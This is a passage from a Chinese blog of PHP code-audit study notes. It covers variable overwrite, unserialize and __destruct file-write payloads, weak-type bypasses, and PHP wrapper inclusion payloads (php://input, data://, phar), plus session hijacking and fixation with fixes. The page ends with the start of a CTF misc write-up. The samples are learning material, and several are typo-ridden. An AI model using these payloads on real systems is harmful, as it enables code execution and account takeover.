<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract函数用来将一个数字分解成多个变量直接使用，下面是W3C的解释：PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。第二个参数<span class="built_in"> type </span>用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。本函数返回成功设置的变量数目。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">'pwd'</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'username'</span>=&gt;<span class="string">'username'</span>,</span><br><span class="line">	<span class="string">'password'</span>=&gt;<span class="string">'password'</span>,</span><br><span class="line">    <span class="string">'rand'</span> =&gt; <span class="string">'rand'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">extract($arr,EXTR_PREFIX_SAME,<span class="string">"pwd"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$usename,$password,$rant"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">","</span>.$pwd_password;  </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>“EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。”</strong></p>
<p>EXTR_IF_EXISTS 似乎同上</p>
<p>parse_str()变量覆盖</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">void</span> parse_str(<span class="built_in">string</span> $encoded_string<span class="meta">[</span>,<span class="built_in">array</span> $result<span class="meta">]</span>)</span><br></pre></td></tr></table></figure>

<p>$encoded_string 输入的字符串</p>
<p>$result 变量将以数组元素的形式存入到这个数组，作为替代</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个很暴力</span><br><span class="line"><span class="variable">$a</span> = b</span><br><span class="line">parse_str(<span class="variable">$a</span> = <span class="string">'n'</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<p>import_request_variables()</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool import_request_variable(<span class="built_in">string</span> $type[,<span class="built_in">string</span> $prefix])</span><br></pre></td></tr></table></figure>

<p>$type 指定需要导入的变量，可用字母G,P,C代表GET POST COOKIE</p>
<p>$prefix    变量名前缀</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = <span class="string">'0'</span>;</span></span><br><span class="line"><span class="php">import_request_varibles(<span class="string">'G'</span>);	<span class="comment">//相当于开启全局变量注册</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($a = <span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> <span class="string">'success'</span>;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> <span class="string">'fail'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&gt;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&gt;&gt;?a=<span class="number">1</span>             <span class="comment">#变量覆盖成功</span></span></span><br></pre></td></tr></table></figure>

<p>修复方案</p>
<ol>
<li>在php.ini文件设置register_globals=Off</li>
<li>使用原始变量数组，如$_POST,$_GET等数组变量进行操作</li>
<li>不使用foreach语句来遍历$_GET变量，而改用[(index)]来制定  （？还是不懂，觉得上面的案例是$$的，待解决）</li>
<li>注册变量前先判断变量是否存在，（就是不用extract这个函数了呗）</li>
</ol>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>序列化：把对象转换为字节序列的过程，成为对象的序列化</p>
<p>反序列化：把字节序列恢复为对象的过程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test1=<span class="string">"SQYY 1028"</span>;</span><br><span class="line">$test2=<span class="keyword">array</span>(<span class="string">"SQYY"</span>,<span class="number">1028</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($test1);			&gt;s:<span class="number">9</span>:<span class="string">"SQYY 1028"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($test2);			&gt;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"SQYY"</span>;i:<span class="number">1</span>;i:<span class="number">1028</span>;&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>漏洞成因</p>
<p>反序列化对象中存在魔术方法，而且魔术方法中的代码可以被控制，</p>
<p>漏洞根据不同的代码可以导致各种攻击，如代码注入，SQL注入、目录遍历等等</p>
<p>序列化的不同结果：1. public 2. private 3. protect</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">    <span class="keyword">public</span> $test2 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $test3 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($test);</span><br><span class="line">&gt;</span><br><span class="line">    </span><br><span class="line">&gt;O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">3</span>:&#123;s:<span class="number">11</span>:<span class="string">"testtest1"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;s:<span class="number">5</span>:<span class="string">"test2"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;s:<span class="number">8</span>:<span class="string">"*test3"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞本质</p>
<p>unserialize函数的变量可控</p>
<p>php文件中存在可利用类，类中有魔术方法</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563373599421.png" alt="1563373599421"></p>
<p>导致代码执行的漏洞( __destruct() )</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct<span class="comment">()</span> 　　- 对象的所有引用都被删除或者当对象被显式销毁时执行</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a = <span class="string">'test'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $fp = fopen(<span class="string">"E:\\Local Test\www\hello.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">        fputs($fp,<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line">$obj = unserialize($_POST[<span class="string">'obj'</span>]);</span><br><span class="line"><span class="keyword">require</span> <span class="string">"E:\\Local Test\www\hello.php"</span>;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">post:</span>obj=<span class="string">O:</span><span class="number">1</span>:<span class="string">"A"</span>:<span class="number">1</span>:&#123;<span class="string">s:</span><span class="number">1</span>:<span class="string">"a"</span>;<span class="string">s:</span><span class="number">18</span>:<span class="string">"&lt;?php&gt; phpinfo();?&gt;"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>因为反序列化obj时，执行了魔术方法，__destruct(),从而引发了文件写入；</p>
<p>漏洞成因，存在魔术方法，魔术方法中的a可控，</p>
<p>防御思路：不用魔术方法，或者使得魔术方法中的变量、代码 用户不可控。</p>
<h3 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h3><p>标准类型：布尔、整型、浮点、字符串</p>
<p>复杂类型：数组、对象</p>
<p>特殊类型：资源 resource</p>
<ol>
<li><p>字符串和数字比较：字符串第一个不为数字前的数字为字符串的值</p>
</li>
<li><p>数字、字符串 和 数组比较，永假</p>
</li>
<li><p>科学计数法的比较，同第一条</p>
</li>
<li><p>==弱类型，===强类型</p>
</li>
</ol>
<p>empty()：变量为0，”0“，null，‘’，false，array()，返回ture</p>
<p>isset：变量未定义或者为null时，返回false</p>
<p>md5</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> md5(<span class="built_in">string</span> $str[,boo $raw_output = <span class="literal">false</span>])</span><br></pre></td></tr></table></figure>

<p>绕过：传入数组（非字符串），返回为NULL</p>
<p>函数strcmp</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="keyword">strcmp</span>(<span class="keyword">string</span> $str1, <span class="keyword">string</span> $str2)</span><br></pre></td></tr></table></figure>

<p>绕过，传入数组（非字符串），返回为0    （字符相同返回为0）</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563416371109.png" alt="1563416371109"></p>
<p>switch    会将参数转化为整型，（ ‘67sfajf ’  -&gt;  67 ）</p>
<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p>file:// 协议</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<p>执行文件内容</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">file</span>://E:Local <span class="keyword">Test</span>\WWW\<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure>

<p>php://filter</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<p>读取文件内容，base64编码</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=conver.base64-encode/resource=./<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>

<p>php://input 可以访问请求的原始数据的只读流</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  on</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url:<span class="built_in">file</span>.php?<span class="built_in">file</span>=php://input</span><br><span class="line"><span class="built_in">post</span>:<span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>写入文件:</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url:<span class="built_in">file</span>.php?<span class="built_in">file</span>=php://input</span><br><span class="line"><span class="built_in">post</span>:<span class="meta">&lt;?</span>php fputs(fopen(<span class="string">"1.txt"</span>,<span class="string">"w"</span>),<span class="string">"1234"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>(觉着就是，执行你post的代码，还认为你post的代码是从文件中提取出来的)</p>
<p>data://协议</p>
<p>allow_url_fopen   :  on</p>
<p>allow_url_include   :  on</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://localhost/test.php?<span class="built_in">file</span>=data://<span class="keyword">text</span>/plain,<span class="meta">&lt;?</span>php phpinfo()<span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">http</span>://localhost/test.php?<span class="built_in">file</span>=data://<span class="keyword">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line"><span class="keyword">http</span>://localhost/test.php?<span class="built_in">file</span>=data:<span class="keyword">text</span>/plain,<span class="meta">&lt;?</span>php phpinfo()<span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">http</span>://localhost/test.php?<span class="built_in">file</span>=data:<span class="keyword">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>

<p>zip://协议</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/test.php?file=zip:/</span><span class="regexp">/D:/</span>phpStudy<span class="regexp">/WWW/</span>txf.zip%<span class="number">23</span>txf.txt</span><br></pre></td></tr></table></figure>

<p>bzip2://协议</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/test.php?file=compress.zlib:/</span><span class="regexp">/./</span>txf.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563417336599.png" alt="1563417336599"></p>
<p>phar://伪协议</p>
<p>首先我们要用phar类打包一个phar标准包</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$p = <span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/phartest2.zip'</span>, <span class="number">0</span>,<span class="string">'phartest2'</span>,Phar::ZIP) ; </span></span><br><span class="line"><span class="php">$x=file_get_contents(<span class="string">'./php.php'</span>);</span></span><br><span class="line"><span class="php">$p-&gt;addFromString(<span class="string">'a.jpg'</span>, </span></span><br><span class="line"><span class="php">$x); </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>会生成一个zip的压缩文件。然后我们构造</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/file.php?file=phar:/</span><span class="regexp">/php.zip/</span>php.jpg</span><br></pre></td></tr></table></figure>

<p>也可以直接shell</p>
<p>其中phar适用范围为php&gt;5.3.0</p>
<p>以下的这种包含方式在这样的情况下是无效的。</p>
<p>include(一个规定的路径+可控点)            (?没太理解，待解决)</p>
<h3 id="会话认证漏洞"><a href="#会话认证漏洞" class="headerlink" title="会话认证漏洞"></a>会话认证漏洞</h3><p>Session 固定动机</p>
<p>Session 劫持攻击</p>
<p>挖掘经验</p>
<p>遇到的比较多的就是出现在cookie验证上，通常是没有使用session来认证，直接将用户信息保存在cookie中</p>
<p>劫持攻击</p>
<p>劫持目标用户的session id来获取网站服务器上未经许可的存取信息，窃取目标用户等cookie数据，来取得网站的认可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_POST[&apos;login&apos;]))&#123;</span><br><span class="line">	$username = $_POST[&apos;username&apos;];</span><br><span class="line">    $password = $_POST[&apos;password</span><br><span class="line">    $con = 	mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">	mysql_select_db(&apos;admin&apos;,$conn);</span><br><span class="line">	$sql = &quot;SELECT* FROM admin WHERE username =&apos; &quot;.$_username.&quot;&apos;&quot;;</span><br><span class="line">	$request = mysql_query($sql) or die(&quot;fail&quot;).mysql_error();</span><br><span class="line">	if($row = mysql_num_rows($result))&#123;</span><br><span class="line">    $_SESSION[&apos;username&apos;]=$username;</span><br><span class="line">    $_SESSION[&apos;password&apos;]=$password;</span><br><span class="line">    $_SESSIon[&apos;book&apos;] = 1;</span><br><span class="line">    header(&quot;localhost:http//127.0.0.1/member.php?user=&quot;.$username);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form method = &apos;post&apos; name=&apos;form&apos;&gt;</span><br><span class="line">            账号：&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;</span><br><span class="line">            密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;</span><br><span class="line">            &lt;input type = &quot;submit&quot; name=&apos;login&apos;/&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'session_id '</span>. session_id().<span class="string">"&lt;br/ &gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'name: '</span>. $_GET[<span class="string">'user'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"book_num"</span>. $_SESSION[<span class="string">'book'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于回显了session_id，</p>
<p>攻击脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'session_id '</span>. session_id().<span class="string">"&lt;br/ &gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'name: '</span>. $_SESSION[<span class="string">'username'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"book_num"</span>. $_SESSION[<span class="string">'book'</span>]=<span class="number">2000.</span><span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url:/attak.php?<span class="attribute">PHPSESSIONID</span>=jdisoay8hdsiaf8yqr89fu39</span><br></pre></td></tr></table></figure>

<p>由于id的泄露，导致攻击者更改了该事件中的book数量。</p>
<p>修复方案：</p>
<ol>
<li>使用随机而且长度够大的数字或字符串来充当session_id</li>
<li>将网页之间传递的数据使用某种形式进行封装，特别是session_id</li>
<li>更改session名称</li>
<li>注销后即销毁session的所数据</li>
</ol>
<p>Session固定攻击</p>
<p>黑客固定住目标用户的session_id，因此目标用户所使用的session可有攻击者指定</p>
<p>（即目标用户用了黑客的session存取数据，黑客再用该session，读取目标的数据）</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">有这么一个场景，当管理员登陆之后，程序生成一个认证session，而此时的session是没有指定session_id的。如果存在一个接口能够让我们指定session_id，那么我们就可以在设置一个session_id连接到这个已经认证的session上去。</span><br><span class="line"></span><br><span class="line">构造一个请求设置session_id的链接让管理员点击，那么我们就拥有了管理员的权限。（CSRF）</span><br><span class="line"></span><br><span class="line">在攻击成功之后，怎么设置我们的session_id呢？</span><br><span class="line"></span><br><span class="line">其实就是我们前端经常看到的这个东西。</span><br><span class="line"></span><br><span class="line"><span class="attribute">PHPSESSID</span>=fdpmos0quo6o7rq69h6v1u6i50;</span><br><span class="line">攻击成功之后，设置<span class="attribute">PHPSESSID</span>=你自己设置的session_id，然后带着这个cookie请求即可访问后台。</span><br></pre></td></tr></table></figure>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">请求后台任意需要认证的页面都是会调用session()方法，而且sessionid的接收是REQUEST方式，那么我们只要让登陆后台的管理员点击类似这样的链接，就可以拿到后台的权限了。</span><br><span class="line"></span><br><span class="line">http://demo.yxcms.<span class="keyword">com</span>/<span class="built_in">index</span>.php?r=admin/<span class="built_in">index</span>/<span class="built_in">index</span>&amp;sessionid=<span class="number">123</span>test</span><br><span class="line"></span><br><span class="line">要让管理员登陆状态下点你的链接，最好的方法是找到个后台的xss啦。</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://xz.aliyun.com/t/2025" target="_blank" rel="noopener">https://xz.aliyun.com/t/2025</a></p>
<p>修复方案</p>
<ol>
<li><p>不要从GET/POST变量中接受session_id</p>
</li>
<li><p>调用session_start函数后，立即生成新的session_id，并删除就得session</p>
</li>
<li><p>将session_id存放在cookie内</p>
</li>
<li><p>注销后即销毁session的所有数据</p>
</li>
<li><p>使用时间戳来记录session的使用时间，如果两次session的相差时间太长，就销毁session的所有数据</p>
</li>
<li><p>检查用户的ip地址，如果ip地址改变就产生新的session_id</p>
<p>且删除旧的session</p>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/18/代码审计基础入门笔记/" data-id="ck2g3l2m5001blgv3fws1w6sy" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/">note</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-赛博杯2019_Write_Up" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/14/赛博杯2019_Write_Up/" class="article-date">
  <time datetime="2019-07-14T08:22:35.000Z" itemprop="datePublished">2019-07-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/14/赛博杯2019_Write_Up/">赛博杯2019_Write_Up</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="赛博杯2019-Write-Up"><a href="#赛博杯2019-Write-Up" class="headerlink" title="赛博杯2019 Write Up"></a>赛博杯2019 Write Up</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>杭电赛博协会出得题，感觉质量还是不错的，难易兼备。以下是比赛题目部分Write Up。</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h3><p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/1.png" alt="1"></p>
<p>扫条形码得到flag。</p>
<h3 id="No-Word"><a href="#No-Word" class="headerlink" title="No Word"></a>No Word</h3><p>snow加密，将文件放入010editor看他的十六进制形式，</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/2.png" alt="2"></p>
<p>0D0A是换行，剩下的将20转0，将09转1，得到的二进制数据，转字符串即可得到flag。</p>
<h3 id="基础社工"><a href="#基础社工" class="headerlink" title="基础社工"></a>基础社工</h3><p>题目介绍：大家都用着我们的数字杭电（<a href="http://i.hdu.edu.cn/" target="_blank" rel="noopener">i.hdu.edu.cn</a>)但是对于其注册者却啥也不知道，所以小y打算去看看注册数字杭电的创始人的邮箱</p>
<p>flag形式为：flag{你找到的电子邮箱}</p>
<p>百度一个IP反查询工具，Whois查询，看看这个IP的备案，</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/3.png" alt="3"></p>
<p>得到flag；</p>
<h3 id="The-world"><a href="#The-world" class="headerlink" title="The world"></a>The world</h3><p>下载得到一张图，猜测是隐写，直接foremost分解，得到四张图，</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/4.png" alt="4"></p>
<p>第一张是可见的，应该没用，剩下来的，按顺序看。</p>
<p>第一份压缩包是加密压缩包，看了一下不是伪加密，于是放入工具进行简单爆破，得到密码abc123，得到文件：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d<span class="number">2</span>abd<span class="number">3</span>fb<span class="number">9</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">93</span>fb<span class="number">064</span>abf<span class="number">81</span>f<span class="number">5</span>fab<span class="number">84</span></span><br><span class="line">新手村钥匙</span><br></pre></td></tr></table></figure>

<p>第二份文件是一张图，猜测是LSB隐写，密码为上述字符串，测试后发现不是。继续考虑，可能是outguess加密，</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -r flag<span class="selector-class">.jpg</span> -t secret<span class="selector-class">.txt</span> -k d2abd3fb9d4c93fb064abf81f5fab84</span><br></pre></td></tr></table></figure>

<p>得到文件</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">95</span>cca<span class="number">6</span><span class="keyword">c</span><span class="number">50e48</span>e<span class="number">86</span><span class="keyword">c</span><span class="number">468</span>ee<span class="number">329</span>ddc<span class="number">11047</span></span><br><span class="line"></span><br><span class="line">最后一关大门的钥匙</span><br></pre></td></tr></table></figure>

<p>第三份文件是一个mp3文件，猜测是MP3隐写，用MP3Stego解密，即可得到flag</p>
<h3 id="Different-P"><a href="#Different-P" class="headerlink" title="Different_P"></a>Different_P</h3><p>hint：PIL是个好东西</p>
<p>下载得到两份一样的文件，试了试盲水印，发现没有用。使用Beyond Compare 4结合后发现<img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/5.png" alt="5"></p>
